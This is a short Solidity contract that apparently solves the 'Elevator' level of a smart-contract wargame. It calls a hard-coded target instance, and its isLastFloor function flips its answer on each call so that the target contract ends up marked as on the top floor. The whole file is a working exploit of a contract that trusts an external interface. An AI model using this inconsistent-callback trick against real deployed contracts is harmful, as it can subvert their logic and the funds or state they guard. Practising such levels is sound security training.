// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Elevator} from "./L12__Elevator.sol";

contract L12_Caller__Elevator {
    Elevator public elevator =
        Elevator(0x44aF8d2d1e112fE90d60C3Ac3C741458799e608c);
    uint256 toggle = 0;

    function callGoTo() public {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) public returns (bool) {
        return (++toggle % 2) == 0;
    }
}
